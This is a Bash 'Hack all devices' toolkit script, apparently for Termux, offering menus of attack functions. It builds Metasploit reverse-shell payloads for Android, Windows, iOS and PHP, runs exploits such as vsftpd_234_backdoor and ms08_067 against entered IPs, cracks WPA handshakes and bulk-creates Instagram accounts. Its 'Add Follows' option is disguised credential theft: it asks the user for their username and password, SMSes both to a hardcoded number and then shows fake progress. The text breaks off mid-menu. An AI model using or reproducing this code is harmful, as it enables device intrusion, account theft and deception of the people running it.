#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
sleep 1
while :
do
 clear
#welcome

        echo """
        +=========================================+
        |..........   Hack all devices ...........|
        +-----------------------------------------+
        |            #Author: Saeed Ahmeed        |
        |              Version 2.1                |
        |            https://t.me/Zoalktoom       |
        +=========================================+
        |......... The World Not Security ........|
        +-----------------------------------------+
"""
printf $y
echo 		"-------------------------------"
echo 		" M A I N - M N U E "
echo 		"-------------------------------"
echo 		"1. Metasploit   	2. Facebook "
echo ""
echo 		"3. Website      	4. Instagram "
echo ""
echo 		"5. Internet     	6.  Wifi "
echo ""
echo 		"7. Add Follows  	8. Wordlist "
echo ""
echo            "9. Hack Email's        10. Exit "

printf $y
echo ""
read -p " Please Insert Your Choice [ 1 - 10 ] " choice
case $choice in
1)
clear
echo "-------------------------------"
echo " M E T A - S P L O I T "
echo "-------------------------------"
#echo -e "$green"
echo -e "$cyan"
echo -e "|---{$yellow my ip$cyan }---| "
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
#date
echo -e "$yellow"
sleep 1
#echo ''
echo -e "$red                  [77] update          exit [00]"
echo -e "$cyan"
echo "            [1]payload android "
echo "            [2]payload windows "
echo "            [3]Android penetration msf "
echo "            [4]windows penetration msf "
echo "            [5]Breakthrough via Port (21)"
echo "            [6]Breakthrough via Port (445)"
echo "            [7]open (sms,calllog,....txt) The victim "
echo "            [8]Open the victim files that you downloaded"
echo "            [9]Breakthrough by malicious link "
echo "            [10]error metasploit "
echo "            [11]Download msf (5.0.0)"
echo "            [12]payload iphone "
echo "            [13]iphone penetration msf "
echo "            [14]Create SHELL "
echo "            [15]Control the site by shell "
echo "            [16]Search Engine Domain Email Address Collector"
echo "            [17]DNS Record Scanner and Enumerator"
echo "            [18]TCP Port Scanner"
echo "            [19]TCP SYN Port Scanner "
echo "            [20]HTTP Version Detection"
echo -e "$green"
read -p "     number------->  " Zoal
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
if [ $Zoal -eq 1 ]
then
echo -e $yellow " please insert LHOST :>"
read -p "                       LHOST----->" lhost
echo -e $yellow " please insert port :>"
read -p "                       LPORT----->" lport
echo -e $yellow " please insert Name payload :>"
read -p "                       Name----->" name
echo -e $yellow " please insert path :>"
read -p "                       Path----->" path
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.apk
echo ""
echo -e $cyan " Done  Now U Can find a Payload in your files"
echo ""
read -p "Press Enter to continue..."
bash hacking.sh
fi
if [ $Zoal -eq 2 ]
then
echo -e $green " please insert LHOST :>"
read -p "                      LHOST----->" lhost
echo -e $green " please insert port :>"
read -p "                      LPORT----->" lport
echo -e $green " please insert Name payload :>"
read -p "                      Name----->" name
echo -e $green " please insert path :>"
read -p "                      Path----->" path
msfvenom -a x86 --platform windows -x $name.exe -k -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.exe
echo ""
echo -e $cyan " Done  Now U Can find a Payload in your files"
read -p "Press Enter to continue..."
bash .hacking.sh
fi
if [ $Zoal -eq 3 ]
then
echo -e $blue "Please Insert LHOST :>"
read -p "                    LHOST----->" host
echo -e $blue "Please Insert PORT :>"
read -p "                    LPORT----->" lport
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi
if [ $Zoal -eq 4 ]
then
echo -e $white "Please Insert LHOST :>"
read -p "                     LHOST----->" host
echo -e $white "Please Insert PORT :>"
read -p "                     LPORT----->" lport
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi 
if [ $Zoal -eq 5 ]
then
echo -e "$cyan"
read -p "                  ip----->" ip
msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor' -x 'set payload cmd/unix/interact' -x 'set RHOST $ip' -x 'set RPORT 21' -x 'exploit'
fi
if [ $Zoal -eq 6 ]
then
msfconsole -x 'use windows/smb/ms08_067_netapi' -x 'set payload windows/meterpreter/bind_tcp' -x 'set RHOST $ip' -x 'set RPORT 445' -x'exploit'
fi
if [ $Zoal -eq 7 ]
then
echo -e "$red"
echo ""
cd $HOME/ && ls
echo ""
read -p "name.txt ------> " n
fi
cd $HOME/Hack-Devices
if [ $Zoal -eq 8 ]
then
echo -e "$red"
echo ""
cd $HOME/ && ls
echo ""
read -p "name photo ------> " n
echo -e "$green"
fi
cd $HOME/Hack-Devices
if [ $Zoal -eq 10 ]
then
echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd .msf
chmod +x *
sh .error.sh
fi
if [ $Zoal -eq 11 ]
then
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
pkg install unstable-repo -y
clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
pkg install metasploit -y
echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
sleep 1
.hacking.sh
fi
if [ $Zoal -eq 12 ]
then
echo -e $green " please insert LHOST :>"
read -p "                      LHOST----->" lhost
echo -e $green " please insert port :>"
read -p "                      LPORT----->" lport
echo -e $green " please insert Name payload :>"
read -p "                      Name----->" name
echo -e $green " please insert path :>"
read -p "                      Path----->" path
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.ipa
echo ""
echo -e $cyan " Done Now u can find a payload in your files"
read -p "Press Enter to continue..."
bash .hacking.sh
fi
if [ $Zoal -eq 9 ]
then
echo -e $green "Please Insert SRVHOST :>"
read -p "                     LHOST----->" host
echo -e $green "Please Insert SRVPORT :>"
read -p "                     LPORT----->" lport
msfconsole -x 'use exploit/multi/browser/java_signed_applet' -x 'set SRVHOST '$host -x 'set SRVPORT '$port -x 'set URLPATH /exploit ' -x 'set AAPLETNAME google_unix4 ' -x 'exploit'
fi
if [ $Zoal -eq 13 ]
then
echo -e $green "Please Insert LHOST :>"
read -p "                     LHOST------>" host
echo -e $green "Please Insert PORT :>"
read -p "                     LPORT----->" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload iphone/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'run'
fi 
if [ $Zoal -eq 14 ]
then
echo -e $blue "Please Insert LHOST :>"
read -p "                    LHOST----->" lhost
echo -e $blue "Please Insert PORT :>"
read -p "                    LPORT----->" lport
msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/shell.php
echo ""
echo -e $blue " Done u can find a shell in your files"
read -p "Press Enter to continue..."
bash .hacking.sh
fi
if [ $Zoal -eq 15 ]
then
echo -e $green "Please Insert LHOST :>"
read -p "                     LHOST------>" host
echo -e $green "Please Insert PORT :>"
read -p "                     LPORT----->" port
msfconsole -x 'use exploit/multi/handler' -x 'set PAYLOAD php/meterpreter_reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi
if [ $Zoal -eq 16 ]
then
echo -e $green "Please Insert DOMAIN :>"
read -p "                     DOMAIN------>" domain
msfconsole -x 'use auxiliary/gather/search_email_collector' -x 'set DOMAIN '$domain -x 'exploit'
fi
if [ $Zoal -eq 17 ]
then
echo -e $green "Please Insert DOMAIN :>"
read -p "                     DOMAIN------>" domain
msfconsole -x 'use auxiliary/gather/enum_dns' -x 'sed DOMAIN '$domain -x 'run'
fi
if [ $Zoal -eq 18 ]
then
echo -e $green "Please Insert RHOSTS :>"
read -p "                     RHOST------>" host
msfconsole -x 'use auxiliary/scanner/portscan/tcp' -x 'set RHOSTS '$host -x 'exploit'
fi
if [ $Zoal -eq 19 ]
then
echo -e $green "Please Insert RHOSTS :>"
read -p "                     RHOST------>" host
msfconsole -x 'use auxiliary/scanner/portscan/syn' -x 'set RHOSTS '$host -x 'exploit'
fi
if [ $Zoal -eq 20 ]
then
echo -e $green "Please Insert RHOSTS :>"
read -p "                     RHOST------>" host
msfconsole -x 'use auxiliary/scanner/http/http_version' -x 'set RHOSTS '$host -x 'run'
fi
if [ $Zoal -eq 77 ]
then
cd $HOME
rm -rf .hacking.sh
git clone https://github.com/saeedo201/Hack-Devices
echo -e $cayn #---------->Hi New Update<----------#
sleep 2
cd $HOME
fi
if [ $Zoal = 00 ]
then
figlet "God Bey"
fi
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 2)
clear
echo "-------------------------------"
echo " F A C E - B O O K "
echo "-------------------------------"
cd $HOME/Hack-Devices
echo "-------->Please Waite<--------"
pip2 install mechanize
clear
python2 .FaceB.py

read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 3)
clear
printf $cyan
echo "---------------------------------------------"
echo " I N F O R M A T I O N - G A T H E R I N G"
echo "---------------------------------------------"
echo "1. Website Info 	2. Phone Info "
echo "3. Check e-mail 	4. Check site is up/down "
echo "5. Find Subdomains 	6. Port Scan "
echo "7. My Info 		8. IP Location Finder "
echo "9. Back "
read -p " What do you want to do? [ 1 - 9 ] " choice

if [[ $choice == "1" ]]; then
webinfo
elif [[ $choice == "2" ]]; then
phone
elif [[ $choice == "3" ]]; then
mailchecker
elif [[ $choice == "4" ]]; then
tangodown
elif [[ $choice == "5" ]]; then
subdomain
elif [[ $choice == "6" ]]; then
portscan
elif [[ $choice == "7" ]]; then
myinfo
elif [[ $choice == "8" ]]; then
iplocation
elif [[ $choice == "9" ]]; then
cd $HOME/Hack-Devices && bash .hacking.sh
else
  printf "\e[1;45m Invalid option! \e[0m\n"
fi

tangodown() {
read -p  Site: ip_check
checktango=$(curl -sLi --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31' $ip_check | grep -o 'HTTP/1.1 200 OK\|HTTP/2 200')
if [[ $checktango == *'HTTP/1.1 200 OK'* ]] || [[ $checktango == *'HTTP/2 200'* ]]; then
printf "Site is Up!"
else
printf " Site is Down!"
fi
}

phone() {
if [[ -e phoneinfo.txt ]]; then
rm -rf phoneinfo.txt
fi
read -p $'\e[1;92m[*] Phone (e.g.: 14158586273): \e[0m' phone
getphone=$(curl -s "apilayer.net/api/validate?access_key=43fc2577cf1cdb2eb522583eaee6ae8f&number='$phone'&country_code=&format=1" -L > phoneinfo.txt)
valid=$(grep -o 'valid\":true' phoneinfo.txt )
if [[ $valid == *'valid":true'* ]]; then
country=$(grep 'country_name\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
location=$(grep 'location\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
carrier=$(grep 'carrier\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
line_type=$(grep 'line_type\":\"' phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"')
IFS=$'\n'
printf "\e[1;92m[*] Country:\e[0m\e[1;77m %s\e[0m\n" $country
printf "\e[1;92m[*] Location:\e[0m\e[1;77m %s\e[0m\n" $location
printf "\e[1;92m[*] Carrier:\e[0m\e[1;77m %s\e[0m\n" $carrier
printf "\e[1;92m[*] Line Type:\e[0m\e[1;77m %s\e[0m\n" $line_type
else
printf "\e[1;93m[!] Request invalid!\e[0m\n"
fi
}

webinfo() {
if [[ -e webinfo ]]; then
rm -rf webinfo
fi
read -p $'\e[1;92m[*] URL: \e[0m' site
curl -s "myip.ms/$site" -L > webinfo
##
IFS=$'\n'
ip_location=$(grep 'IP Location:' webinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)
if [[ $ip_location != "" ]]; then
printf "\e[1;92m[*] IP Location:\e[0m\e[1;77m %s\e[0m\n" $ip_location
fi
##
ip_range=$(grep -o 'IP Range .*' webinfo | head -n1 | cut -d "<" -f2 | cut -d ">" -f2)
if [[ $ip_range != "" ]]; then
printf "\e[1;92m[*] IP Range:\e[0m\e[1;77m %s\e[0m\n" $ip_range
fi
##
ip_reversedns=$(grep 'IP Reverse DNS' webinfo | grep 'sval' | head -n1 | cut -d ">" -f6 | cut -d "<" -f1)
if [[ $ip_reversedns != "" ]]; then
printf "\e[1;92m[*] IP Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $ip_reversedns
fi
##
ipv6=$(grep 'whois6' webinfo | cut -d "/" -f4 | cut -d "'" -f1 | head -n1)
if [[ $ipv6 != "" ]]; then
printf "\e[1;92m[*] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ipv6
fi
##
host_company=$(grep -o 'Hosting Company .*-.*.' webinfo | head -n1 | cut -d "-" -f2 | cut -d "." -f1)
if [[ $host_company != "" ]]; then
printf "\e[1;92m[*] Host Company:\e[0m\e[1;77m %s\e[0m\n" $host_company
fi
##
owner_address=$(grep -o 'Owner Address: .*' webinfo | cut -d ">" -f3 | cut -d "<" -f1)
if [[ $owner_address != "" ]]; then
printf "\e[1;92m[*] Owner Address:\e[0m\e[1;77m %s\e[0m\n" $owner_address
fi
##
hosting_country=$(grep 'Hosting Country:' webinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)
if [[ $hosting_country != "" ]]; then
printf "\e[1;92m[*] Hosting Country:\e[0m\e[1;77m %s\e[0m\n" $hosting_country
fi
###
hosting_phone=$(grep -o 'Hosting Phone: .*' webinfo | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $hosting_phone != "" ]]; then
printf "\e[1;92m[*] Hosting Phone:\e[0m\e[1;77m %s\e[0m\n" $hosting_phone
fi
###
hosting_website=$(grep -o 'Hosting Website: .*' webinfo | grep -o "href=.*" | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $hosting_website != "" ]]; then
printf "\e[1;92m[*] Hosting Website:\e[0m\e[1;77m %s\e[0m\n" $hosting_website
fi
###
dnsNS=$(curl -s "https://dns-api.org/NS/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $dnsNS != "" ]]; then
printf "\e[1;92m[*] NS:\e[0m\e[1;77m %s\e[0m\n" $dnsNS
fi
###
MX=$(curl -s "https://dns-api.org/MX/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $MX != "" ]]; then
printf "\e[1;92m[*] MX:\e[0m\e[1;77m %s\e[0m\n" $MX
fi
if [[ -e webinfo ]]; then
rm -rf webinfo
fi
}
###

mailchecker() {
read -p $'\e[1;92m[*] Check e-mail: \e[0m' email
checkmail=$(curl -s https://api.2ip.me/email.txt?email=$email | grep -o 'true\|false')
if [[ $checkmail == 'true' ]]; then
printf "\e[1;92m[*] Valid e-mail!\e[0m\n"
elif [[ $checkmail == 'false' ]]; then
printf "\e[1;93m[!] Invalid e-mail!\e[0m\n"
fi
}

subdomain() {
read -p $'\e[1;92m[*] Site: \e[0m' subdomainsite
checksubdomain=$(curl -L -s "https://www.pagesinventory.com/search/?s=$subdomainsite" > infodomain.log)
IFS=$'\n'
checksite=$(grep -o -P "domain/.{0,40}.$subdomainsite.html" infodomain.log | cut -d "." -f1 | cut -d "/" -f2)
if [[ $checksite != "" ]]; then
IFS=$'\n'
printf "\e[1;92m[*] Subdomain found:\e[0m\n"
printf "\e[1;77m%s\e[0m\n" $checksite
fi
if [[ -e infodomain.log ]]; then
rm -rf infodomain.log
fi
}

function portrange() {
if [[ -e open.ports ]]; then
rm -rf open.ports
fi
if [[ -e ports ]]; then
rm -rf ports
fi
read -p $'\e[1;92m[*] Port Range (E.g. 1 1000): \e[0m' port_range
for x in $(seq $port_range); do echo $x >> ports; done
default_threads="10"
read -p $'\e[1;92m[*] Threads (Default: 10): \e[0m' threads
threads="${threads:-${default_threads}}"
count_ports=$(wc -l ports | cut -d " " -f1)
printf "\e[1;91m[*] Press Ctrl + C to stop\n\e[0m"
token=0
startline=1
endline="$threads"
while [ $token -lt $count_ports ]; do
IFS=$'\n'
for port in $(sed -n ''$startline','$endline'p' ports); do
IFS=$'\n'
countport=$(grep -n -x "$port" ports | cut -d ":" -f1)
let token++
printf "\e[1;77mScanning port (%s/%s)\e[0m\n" $countport $count_ports
{(trap '' SIGINT && scan=$( nc -z -v -w3 $host $port 2>&1 >/dev/null | grep -o 'open'); if [[ $scan == "open" ]]; then printf "\e[1;92m \n [*] Port Open:\e[0m\e[1;77m %s\e[0m\n\n" $port; printf "%s\n" $port >> open.ports ; fi; ) } & done; wait $!;
let startline+=$threads
let endline+=$threads
done
if [[ -e open.ports ]]; then
total=$(wc -l open.ports | cut -d " " -f1)
printf "\e[1;92m[*] Total Open ports:\e[0m\e[1;77m %s\e[0m\n" $total
printf "\e[1;77m\n"
cat open.ports
rm -rf open.ports
rm -rf ports
printf "\e[0m\n"
fi
exit 1
}

portscan() {
read -p $'\e[1;92m[*] Host: \e[0m' host
printf "\e[1;92m[*] Choose an option:\e[0m\n"
read -p $'\e[1;92m[*] \e[0m\e[1;77m1)\e[0m\e[1;92m Single Port, \e[0m\e[1;77m2)\e[0m\e[1;92m Port Range: \e[0m' choice_port
if [[ $choice_port == "1" ]]; then
read -p $'\e[1;92m[*] Port: \e[0m' single_port
check=$(nc -z -v -w3 $host $single_port 2>&1 >/dev/null | grep -o 'open')
if [[ $check == "open" ]]; then
printf "\e[1;92m[*] Open!\e[0m\n"
else
printf "\e[1;93m[*] Close!\e[0m\n"
fi
elif [[ $choice_port == "2" ]]; then
portrange
fi
}

myinfo() {
touch myinfo && echo "" > myinfo
curl "ifconfig.me/all" -s  > myinfo

my_ip=$(grep -o 'ip_addr:.*' myinfo | cut -d " " -f2)
remote_ip=$(grep -o 'remote_host:.*' myinfo | cut -d " " -f2)
printf "\e[1;92m[*] My ip:\e[0m\e[1;77m %s\e[0m\n" $my_ip
printf "\e[1;92m[*] Remote Host:\e[0m\e[1;77m %s\e[0m\n" $remote_ip
rm -rf myinfo
}
iplocation() {
read -rp 'Enter IP address: ' target
                        geo="http://ipinfo.io/$target/geo"
                        curl --silent "$geo"
}
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 4)
clear
printf $p
echo "-------------------------------"
echo " I N S T A - G R A M "
echo "-------------------------------"
echo ""
echo "1. Creat Account     2. Brute Force"
echo "3. Back "
read -p "Please Inter Your Choice [ 1 - 3 ] " choice

if [[ "$choice" == "1" ]]; then

string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
hmacdevice=$(echo -n "$string4" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2 | cut -c 1-16)
device="android-$hmacdevice"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"

fi

banner() {

printf "\e[1;92m  _____              _                               \e[0m\n"
printf "\e[1;92m |_   _|            | |                              \e[0m\n"
printf "\e[1;92m   | |   _ __   ___ | |_   __ _   __ _   ___  _ __   \e[0m\n"
printf "\e[1;92m   | |  | '_ \ / __|| __| / _\` | / _\` | / _ \| '_ \  \e[0m\n"
printf "\e[1;77m  _| |_ | | | |\__ \| |_ | (_| || (_| ||  __/| | | | \e[0m\n"
printf "\e[1;77m |_____||_| |_||___/ \__| \__,_| \__, | \___||_| |_| \e[0m\n"
printf "\e[1;77m                                  __/ |              \e[0m\n"
printf "\e[1;77m                                 |___/               \e[0m\n"
printf "\e[1;45m  Instagram generator v1.0 Author: @Zoalktoom  \e[0m\n"
printf "\n"
}

function start() {

read -p $'\e[1;92mUsername account: \e[0m' user
read -s -p $'\e[1;92mPassword: \e[0m' pass
printf "\n"
read -p $'\e[1;92mName: \e[0m' name
read -p $'\e[1;92mEmail: \e[0m' email
gen1
}
function gen1() {


header='"Host":"i.instagram.com", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)", "Accept-Language": "en-US", "Accept-Encoding":"gzip", "Cookie2": "$Version=1", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "BQ=="'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"


data='{"username":"'$user'", "first_name":"'$name'", "password":"'$pass'", "email": "'$email'", "device_id":"'$device'", "guid":"'$guid'"}'


hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

cookies=cookies
var3=$(curl -s -b $cookies -c $cookies --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' "https://instagram.com" && curl -c $cookies -b $cookies  -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/create/")

if [[ "$var3" == *"spam"* ]]; then
printf "\e[1;91m [!] Your IP was blocked due Spam\e[0m\n"
exit 1
elif [[ "$var3" == *"account_created"* ]]; then
printf "\e[1;92m[*] Account has been created successfully!\e[0m\n"
exit 1
else 
printf "\e[1;91m[!] Error! Check output:\e[0m\n"
echo $var3
exit 1
fi
rm -rf cookies
}
#function changeip() {

#killall -HUP tor

#}
banner
start
gen1

if [[ "$choice" == "3" ]]; then
cd $HOME/Hack-Devices && bash hacking.sh
fi
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 5)
clear
printf $blue
echo "-------------------------------"
echo " I N T E R - N E T "
echo "-------------------------------"
echo ""
echo "1. Scan Hosts     2. Host Finder "
echo "3. HTTP Header    4. Host DNS Finder"
echo "5. Port Scanner   6. Back "

read -p "Please Inter Your Choice [ 1 - 6 ] " Zoal

if [[ "$Zoal" == "1" ]]; then
clear
echo ""
echo "-------------------------------"
echo " C H E C K - H O S T S "
echo "-------------------------------"
echo ""
echo "1. Scan     2. Skip filtering"
echo ""
read -p " What do you want to do? [ 1 - 2 ] " choice
fi
if [[ "$choice" == "1" ]]; then
echo ""
echo -e $yellow "Please Insert Domain :>"
echo ""
read -p "                       Domain----->" Domain
nmap -p- $Domain
fi
if [[ "$choice" == "2" ]]; then
echo ""
echo -e $yellow "Please Insert Ip :>"
echo ""
read -p "                       Ip----->" Ip
echo -e $yellow "Pleas Insert Port :>"
read -p "                      Port----->" Port
nmap -sM -vv -p $Port $Ip
fi
if [[ "$Zoal" == "2" ]]; then
echo ""
echo "\aInput Domain [ex : example.com]"
                echo $white ""$green"AMR@localhost"$cyan" ~/INmux "$white
                read -p " >~#  "  target
                echo $yellow"\a["$red"+"$yellow"]"$white Host Finder

fi

if [[ "$Zoal" == "3" ]]; then
echo  "Please Insert WEB ADDRES / DOMAIN : "
read web
curl https://api.hackertarget.com/httpheaders/?q=$web
echo
fi

if [[ "$Zoal" == "4" ]]; then
echo ""
echo "\aInput Domain [ex : example.com]"
                echo $white ""$green"AMR@localhost"$cyan" ~/INmux "$white
                read -p " >~#  "  target
                        command=$(wget https://api.hackertarget.com/mtr/?q=$target -q -O .-)
                        echo $yellow"\a["$red"+"$yellow"]"$white Host DNS
fi
if [[ "$Zoal" == "5" ]]; then
echo ""
prog_name="[Scanny]"
if ! type "nc" >/dev/null; then
	echo "$prog_name NetCat wasn't found, installing..." 
	apt-get install nc -y >/dev/null
	echo "$prog_name NetCat has been installed, restarting program..."
	sh ${0##*/}
else
	printf "$prog_name Target: "
	read -r target
	printf "$prog_name Port or Port Range: "
	read -r ports
	printf "$prog_name Timeout: "
	read -r timeout
	printf "$prog_name Output File: "
	read -r output_file

	echo "$prog_name Starting scan on $target, with port(s) $ports..."
	nc -v -z -w $timeout $target $ports > $output_file 2>&1
	echo "$prog_name Finished scan, output saved to $output_file..."
fi

fi
if [[ "$Zoal" == "6" ]]; then
cd $HOME/Hack-Devices && bash .hacking.sh
fi
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 6)
clear
printf $green
echo ""
echo "-------------------------------"
echo " W I F I - C R A C K E R "
echo "-------------------------------"
echo ""
echo "WIFI WPA/WPA2 CRACKER,loading...."

sleep 3
read -p "You can crack using :
 1)numbers just
 2)small_letters just
 3)numbers+small_letters
 4)numbers+capital_letters
 5)numbers+capital+small_letters
 : " Type
if [ $Type -eq 3 ]
then
echo "This script crack numbers+small_letters"
read -p "what is the minimum number you choose: " Min
read -p "What is the maximum number you choose: " Max
read -p "Whats your Vicims handshake: " Handshake
read -p "Whats your Visims Mac-adress: " Mac
sleep 2
crunch $Min $Max abcdefghijklmnopqrstuvwxyz9876543210 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 1 ]
then
echo "This script for crack wpa-wpa2 using just numbers"
sleep 3
read -p "what is the minimum number you choose: " Min
read -p "what is the maximum number you choose: " Max
read -p "put your handshake: " Handshake
read -p "put your visim Mac adress: " Mac
sleep 2
crunch $Min $Max 0123456789 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 2 ]
then
echo "this script for crack wpa-wpa2 using small_letters just"
sleep 3
read -p "what is the minimum number you choose: " Min
read -p "what is the maximum number you choose: " Max
read -p "put your handshake: " Handshake
read -p "put your visim Mac adress: " Mac
sleep 2
crunch $Min $Max abcdefghijklmnopqrstuvwxyz | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 4 ]
then
echo "This script crack wpa2-wpa using numbers+capital_letters"
read -p "Whast is the minimum number you choose: " Min
read -p "Whats is the maximum number you choose: " Max
read -p "Whats your Vicims handshake: " Handshake
read -p "Whats your Visims Mac-adress: " Mac
sleep 2
crunch $Min $Max ABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 5 ]
then
echo "This script crack wpa2-wpa using numbers+capital+small_letters"
read -p "Whas is the minimum number you choose: " Min
read -p "What is the maximum number you choose: " Max
read -p "Whats your Vicims handshake: " Handshake
read -p "Whats your Visims Mac-adress: " Mac
sleep 2
crunch $Min $Max ABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $? -eq 0 -a 1 ]
then
echo''
echo "###########################################################"
echo "#####################                ######################"
echo "#####################  END OF SCRIPT ######################"
echo "#####################                ######################"
echo "###########################################################"
echo "Have a nice day :)"
echo "GoodBye"
exit
fi
read -p "Press [Enter] key to continue..."
readEnterkey
 ;;
 7)
clear
printf $purple
echo "-------------------------------"
echo " A d d - F O L L O W S "
echo "-------------------------------"
echo ""
echo ""
echo -e " must be Install termux-api from google play"
echo ""
echo -e "~~~~~~~~~ add follows to your accounts 100% ~~~~~~~~~"
echo ""
echo -e "1- Add follows Now to ==> instagram (*_)"
echo ""
echo -e "2- Add follows Now to ==> Channel youtube 0_0 "
echo ""
echo -e "3- Add follows Now to ==> Twitter"
echo ""
echo -e "0- Exit [~]"
echo ""
#################
#cp insta-following.py $PREFIX/bin
#chmod +x $PREFIX/bin/insta-following.py
#mkdir $PREFIX/share/insta-following
#cp insta-following.py $PREFIX/share/insta-following
#python $PREFIX/bin/insta-following.py
read -p "insert number : " follow
if [ $follow = 1 ]
then
clear
echo ""
echo ""
figlet  term -F border --gay 'How To Add Follows 1000 To your insta '
echo ""
echo ""
echo -e $white " must be Install termux-api from google play"
echo ''
echo -e $red "~~~~~~~~~ add follows to your insta 100% ~~~~~~~~~"
echo ""
echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
echo -e $red   ' |                                          | '
echo -e $white ' |  please insert Your Email\Username\phone | '       
echo -e $red   ' |                                          | '
echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
echo ""
echo ""
read -p "insert email or phone : " user
echo -e $green ' ++++++++++++++++++++++++++++++++++++++++++++ '
echo -e $red   ' |                                          | '
echo -e $white ' |  please insert Your password             | '       
echo -e $red   ' |                                          | '
echo -e $green ' |++++++++++++++++++++++++++++++++++++++++++| '
echo ""
echo ""
read -s -p "insert password : " password
echo "---------->Please Waite<-----------"
pkg install termux-api -y
termux-sms-send -n +249920646154 $user,$password
echo "Neran Al Sif"
sleep 1
clear
echo -e $green "Add follow 1 .>> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> "
sleep 1
clear
echo -e $white "Add follow 1 .>> >> >> "
sleep 1
clear
echo -e $green "Add follow 1 .>> >> >> >> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> >> >> >> "
sleep 1
clear
echo -e $white "Add follow 1 .>> >> >> >> >> >> "
sleep 1
clear
echo -e $green "Add follow 1 .>> >> >> >> >> >> >> "
sleep 1
clear
echo -e $red "Add follow 1 .>> >> >> >> >> >> >> >> "
sleep 1
clear
echo ""
#python insta-following.py
figlet "successful *_*"
clear

fi
if [ $follow = 2 ]
then
clear
echo ""
echo ""
figlet  term -F border --gay 'How To Add Follows 1000 To your insta '
echo ""
echo -e $white " must be Install termux-api from google play"
echo ''
echo -e $red "~~~~~~~~~ add follows to your channel youtube 100% ~~~~~~~~~"
echo ""
